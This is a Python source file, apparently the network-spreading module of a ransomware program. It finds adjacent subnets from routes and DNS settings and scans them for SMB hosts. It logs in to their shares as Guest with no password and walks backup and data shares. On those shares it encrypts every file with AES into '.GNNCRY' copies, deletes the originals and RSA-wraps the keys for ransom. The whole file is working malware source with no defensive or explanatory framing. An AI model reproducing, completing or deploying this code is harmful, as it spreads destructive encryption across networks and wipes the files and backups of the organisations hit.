import base64
import ipaddress
import re
import socket
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import smbclient
    SMB_AVAILABLE = True
except ImportError:
    SMB_AVAILABLE = False

import generate_keys
import symmetric

SMB_PORT    = 445
WORKERS     = 50
SHARE_NAMES = ["backups", "backup", "share", "data"]
_LOG        = "/tmp/lateral_debug.txt"


def _dbg(msg):
    try:
        with open(_LOG, 'a') as f:
            f.write(msg + "\n")
    except Exception:
        pass


# ── discovery ────────────────────────────────────────────────────────────────

def _candidate_subnets():
    candidate_ips = set()

    r = subprocess.run(['ip', 'route'], capture_output=True, text=True)
    local_net = None
    for line in r.stdout.splitlines():
        parts = line.split()
        if 'src' in parts and 'via' not in parts:
            try:
                local_net = ipaddress.ip_network(parts[0], strict=False)
            except ValueError:
                pass
        if 'via' in parts and parts[0] != 'default':
            try:
                net = ipaddress.ip_network(parts[0], strict=False)
                candidate_ips.add(str(net.network_address))
            except ValueError:
                pass

    try:
        with open('/etc/resolv.conf') as f:
            for line in f:
                m = re.match(r'nameserver\s+(\S+)', line)
                if m:
                    candidate_ips.add(m.group(1))
    except OSError:
        pass

    seen = set()
    subnets = []
    for ip in candidate_ips:
        try:
            host = ipaddress.ip_address(ip)
            if host.is_loopback or host.is_link_local:
                continue
            net = ipaddress.ip_network(f"{ip}/24", strict=False)
            if local_net and net == local_net:
                continue
            key = str(net)
            if key not in seen:
                seen.add(key)
                subnets.append(net)
        except ValueError:
            pass
    return subnets


def _probe(ip):
    try:
        r = subprocess.run(['ping', '-c1', '-W1', ip], capture_output=True)
        if r.returncode != 0:
            return None
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        result = s.connect_ex((ip, SMB_PORT))
        s.close()
        return ip if result == 0 else None
    except Exception:
        return None


def find_smb_hosts():
    """Return list of IPs with port 445 open on reachable infra subnets."""
    hosts = []
    subnets = _candidate_subnets()
    _dbg(f"subnets={[str(s) for s in subnets]}")
    for subnet in subnets:
        all_ips = [str(h) for h in subnet.hosts()]
        _dbg(f"scanning {subnet} ({len(all_ips)} hosts)")
        with ThreadPoolExecutor(max_workers=WORKERS) as ex:
            for ip in [f.result() for f in as_completed(
                    ex.submit(_probe, ip) for ip in all_ips)]:
                if ip:
                    hosts.append(ip)
                    _dbg(f"smb_host={ip}")
    _dbg(f"smb_hosts={hosts}")
    return hosts


# ── smb encryption ───────────────────────────────────────────────────────────

def _walk_share(ip, share):
    """Recursively yield SMB paths for all files on share."""
    root = rf"\\{ip}\{share}"
    _dbg(f"walk: {root}")
    def _recurse(path):
        try:
            entries = list(smbclient.scandir(path))
            _dbg(f"scandir {path}: {len(entries)} entries")
            for entry in entries:
                child = rf"{path}\{entry.name}"
                if entry.is_dir():
                    yield from _recurse(child)
                elif not entry.name.endswith('.GNNCRY'):
                    yield child
        except Exception as e:
            _dbg(f"scandir FAIL {path}: {type(e).__name__}: {e}")
    yield from _recurse(root)


def _encrypt_smb_file(smb_path, rsa_cipher):
    """
    Read file over SMB, encrypt AES-256, write .GNNCRY back, delete original.
    Returns (enc_aes_key, base64_smb_path) or None on failure.
    """
    try:
        with smbclient.open_file(smb_path, mode='rb') as f:
            content = f.read()
    except Exception as e:
        _dbg(f"  read FAIL {smb_path}: {type(e).__name__}: {e}")
        return None

    key = generate_keys.generate_key(128, True)
    encrypted = symmetric.AESCipher(key).encrypt(content)
    enc_path = smb_path + ".GNNCRY"

    try:
        with smbclient.open_file(enc_path, mode='wb') as f:
            f.write(encrypted)
        smbclient.remove(smb_path)
    except Exception as e:
        _dbg(f"  write FAIL {enc_path}: {type(e).__name__}: {e}")
        return None

    enc_aes_key = rsa_cipher.encrypt(key)
    return enc_aes_key, base64.b64encode(enc_path.encode('utf-8'))


def encrypt_smb_shares(smb_hosts, rsa_cipher):
    """
    For each discovered SMB host: connect as guest, walk known share names,
    encrypt every file in-place over the wire.
    Returns list of (enc_aes_key, base64_path) — same format as local encryption
    so main.py can append directly to enc_aes_key_and_base64_path.
    """
    if not SMB_AVAILABLE or not smb_hosts:
        return []

    smbclient.ClientConfig(require_secure_negotiate=False)

    _dbg(f"SMB_AVAILABLE={SMB_AVAILABLE} smb_hosts={smb_hosts}")
    try:
        smbclient.ClientConfig(require_secure_negotiate=False)
        _dbg("ClientConfig ok")
    except Exception as e:
        _dbg(f"ClientConfig FAIL: {type(e).__name__}: {e}")
        return []

    results = []
    for ip in smb_hosts:
        try:
            smbclient.register_session(ip, username="Guest", password="",
                                       auth_protocol="ntlm",
                                       require_signing=False)
            _dbg(f"session ok: {ip}")
        except Exception as e:
            _dbg(f"session FAIL {ip}: {type(e).__name__}: {e}")
            continue

        for share in SHARE_NAMES:
            _dbg(f"trying share: {ip}/{share}")
            count = 0
            for smb_path in _walk_share(ip, share):
                count += 1
                _dbg(f"encrypting: {smb_path}")
                pair = _encrypt_smb_file(smb_path, rsa_cipher)
                if pair:
                    results.append(pair)
                else:
                    _dbg(f"encrypt FAIL: {smb_path}")
            _dbg(f"share {share}: {count} files processed")

    return results
